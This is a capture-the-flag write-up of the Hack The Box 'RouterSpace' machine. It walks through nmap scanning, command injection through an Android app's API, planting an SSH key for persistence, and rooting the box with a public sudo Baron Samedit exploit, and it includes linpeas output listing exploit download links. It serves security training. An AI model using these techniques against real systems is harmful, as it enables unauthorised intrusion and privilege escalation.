# Hackthebox - RouterSpace

- Linux

![RouterSpace](../.res/HTB-routerspace.png)

- [Box on HTB](https://app.hackthebox.com/machines/444)

## Nmap

```bash
┌──(root💀kali)-[~/Documents/hackthebox/routerspace]
└─# nmap -T5 -sC -sV -O -Pn -p- 10.10.11.148
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-14 17:40 EDT
sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.10.11.148, 16) => Operation not permitted
Offending packet: TCP 10.10.14.11:62477 > 10.10.11.148:14426 S ttl=54 id=40535 iplen=44  seq=3554380708 win=1024 <mss 1460>
Nmap scan report for 10.10.11.148
Host is up (0.022s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-RouterSpace Packet Filtering V1
| ssh-hostkey: 
|   3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)
|   256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)
|_  256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)
80/tcp open  http
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: RouterSpace
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-7888
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 71
|     ETag: W/"47-sX+54c6peisKtGNZVOIFN0Fam58"
|     Date: Sat, 14 May 2022 21:49:15 GMT
|     Connection: close
|     Suspicious activity detected !!! {RequestID: p rA9A JaHgw G OJe }
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-17500
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=0
|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT
|     ETag: W/"652c-17d476c9285"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 25900
|     Date: Sat, 14 May 2022 21:49:15 GMT
|     Connection: close
|     <!doctype html>
|     <html class="no-js" lang="zxx">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>RouterSpace</title>
|     <meta name="description" content="">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/owl.carousel.min.css">
|     <link rel="stylesheet" href="css/magnific-popup.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/themify-icons.css">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-83120
|     Allow: GET,HEAD,POST
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 13
|     ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"
|     Date: Sat, 14 May 2022 21:49:15 GMT
|     Connection: close
|     GET,HEAD,POST
|   RTSPRequest, X11Probe: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.92%I=7%D=5/14%Time=6280220D%P=x86_64-pc-linux-gnu%r(NULL
SF:,29,"SSH-2\.0-RouterSpace\x20Packet\x20Filtering\x20V1\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.92%I=7%D=5/14%Time=6280220D%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,31BA,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\n
SF:X-Cdn:\x20RouterSpace-17500\r\nAccept-Ranges:\x20bytes\r\nCache-Control
SF::\x20public,\x20max-age=0\r\nLast-Modified:\x20Mon,\x2022\x20Nov\x20202
SF:1\x2011:33:57\x20GMT\r\nETag:\x20W/\"652c-17d476c9285\"\r\nContent-Type
SF::\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x2025900\r\nDate:\x
SF:20Sat,\x2014\x20May\x202022\x2021:49:15\x20GMT\r\nConnection:\x20close\
SF:r\n\r\n<!doctype\x20html>\n<html\x20class=\"no-js\"\x20lang=\"zxx\">\n<
SF:head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<me
SF:ta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20\x20\
SF:x20\x20<title>RouterSpace</title>\n\x20\x20\x20\x20<meta\x20name=\"desc
SF:ription\"\x20content=\"\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\
SF:x20content=\"width=device-width,\x20initial-scale=1\">\n\n\x20\x20\x20\
SF:x20<link\x20rel=\"stylesheet\"\x20href=\"css/bootstrap\.min\.css\">\n\x
SF:20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/owl\.carousel\.
SF:min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/
SF:magnific-popup\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20
SF:href=\"css/font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"st
SF:ylesheet\"\x20href=\"css/themify-icons\.css\">\n\x20")%r(HTTPOptions,10
SF:8,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX-Cdn:\x20
SF:RouterSpace-83120\r\nAllow:\x20GET,HEAD,POST\r\nContent-Type:\x20text/h
SF:tml;\x20charset=utf-8\r\nContent-Length:\x2013\r\nETag:\x20W/\"d-bMedpZ
SF:YGrVt1nR4x\+qdNZ2GqyRo\"\r\nDate:\x20Sat,\x2014\x20May\x202022\x2021:49
SF::15\x20GMT\r\nConnection:\x20close\r\n\r\nGET,HEAD,POST")%r(RTSPRequest
SF:,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n
SF:")%r(X11Probe,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20
SF:close\r\n\r\n")%r(FourOhFourRequest,12C,"HTTP/1\.1\x20200\x20OK\r\nX-Po
SF:wered-By:\x20RouterSpace\r\nX-Cdn:\x20RouterSpace-7888\r\nContent-Type:
SF:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2071\r\nETag:\x20W/
SF:\"47-sX\+54c6peisKtGNZVOIFN0Fam58\"\r\nDate:\x20Sat,\x2014\x20May\x2020
SF:22\x2021:49:15\x20GMT\r\nConnection:\x20close\r\n\r\nSuspicious\x20acti
SF:vity\x20detected\x20!!!\x20{RequestID:\x20p\x20\x20rA9A\x20\x20\x20JaHg
SF:w\x20\x20G\x20OJe\x20}\n\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (92%), Linux 5.0 (92%), Linux 5.0 - 5.4 (91%), Linux 5.3 - 5.4 (91%), Linux 2.6.32 (91%), Crestron XPanel control system (90%), Linux 5.0 - 5.3 (89%), Linux 5.4 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%)
No exact OS matches for host (test conditions non-ideal).

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.49 seconds                                                               
```

## Port 80

- We have this page  
![image](https://user-images.githubusercontent.com/96747355/168449299-c15f82ea-b67c-45c2-982a-48c2627af167.png)  
- If we click on download we get and apk file  
![image](https://user-images.githubusercontent.com/96747355/168449318-3bedfdb3-1fcb-4593-8aff-c50f15f463c4.png)  
- Let's open it with jadx-gui. With the manifest we know that we can install in an Android from API 21 to API 30. `<uses-sdk android:minSdkVersion="21" android:targetSdkVersion="30"/>`

- Let's see what we get if we launch it from an AVD  
![image](https://user-images.githubusercontent.com/96747355/168450143-67883500-437e-4c75-80da-95a480e97444.png)  
- We click on next and we have a router we can check status  
![image](https://user-images.githubusercontent.com/96747355/168450166-7f2a9080-84a3-44e8-b9de-39955cfb7f30.png)  
- We need to launch burp and set it to intercept traffic from the avd. You can check my documentation on [Android here](../mobile-app/android.md) to see how to set this up.
- We have an interesting request here. This happens when we click on the "Check status button  
![request](../.res/2023-02-04-16-32-01.png)
- We need to change our /etc/hosts file to be able to reach it `10.10.11.148	routerspace.htb`
- Once our hosts file is modified here is what happens in burp

![burp](../.res/2023-02-04-16-34-46.png)

- If we send this to the repeater and try command injection we can actually execute commands on the server  

![whoami](../.res/2023-02-04-16-47-09.png)

- So we have a user `paul`
- We can event grab the user flag this way

![user](../.res/2023-02-04-16-48-38.png)

- We have an `.ssh` folder in the home but it does not have a key
- Let's get a reverse shell. I tried multiple command and was not successful to get a shell. It seems like there is a protection block of some sort.
- The other option would be to generate a secret key and write it in the .ssh folder of Paul as we have access to it.
- `ssh-keygen` we generate and ssh key I will name mine routerspace_rsa  

![keygen](../.res/2023-02-05-10-10-45.png)  

- So now we need to write it in the ssh folder using burp. We will have to escape double quotes for the command to actually work.  

![authorized_keys](../.res/2023-02-05-10-20-04.png)  

- We can cat it to make sure it worked  

![cat key](../.res/2023-02-05-10-32-31.png)  

- Now we should be able to log in with ssh using it. So I made a typo in for the filename make sure you name it `authorized_keys`, I modified it with mv.  
- `ssh -i routerspace_rsa paul@10.10.11.148` now you should be able to login with ssh  

![ssh](../.res/2023-02-05-10-41-54.png)  

## Privilege escalation

- Let's get linpeas `wget https://github.com/carlospolop/PEASS-ng/releases/download/20230205/linpeas_linux_amd64`
- We will need to use scp because of the restrictions we had previously [here](https://csbygb.gitbook.io/pentips/post-exploitation/files-transfert#ssh-creds-needed) is an example on scp `scp FILE-TO-SEND user@ip:/path/to/folder` so in my case `scp -i routerspace_rsa linpeas_linux_amd64 paul@10.10.11.148:/home/paul` (we need to specify the key)
- `chmod +x linpeas_linux_amd64` from the target we make our file executable
- `./linpeas_linux_amd64` we can run it

### Interesting output

- So here is what we could investigate from our linpeas output

```bash
Vulnerable to CVE-2021-3560 # This one shows up as a 95% PE vector
# It is also worth checking the other CVEs found by linpeas
[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/home/paul/.pm2/pub.sock
  └─(Read Write)
/home/paul/.pm2/rpc.sock
  └─(Read Write)
╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd
```

- The polkit CVE will not work because it needs Gnome-Control-Center which we do not have here.
- Linpeas also mentions `CVE-2021-3156`. Let's get try with the poc from linepeas. [Here](https://github.com/blasty/CVE-2021-3156) are the steps.
- No luck with this exploit, let's try another one and if it does not work we will try another CVE
- Let's have a look at [this one](https://github.com/worawit/CVE-2021-3156)
- `wget https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py`
- `scp -i routerspace_rsa exploit_nss.py paul@10.10.11.148:/home/paul`
- `python3 exploit_nss.py` and this time it works. We can grab the root flag  

![root flag](../.res/2023-02-05-12-21-19.png)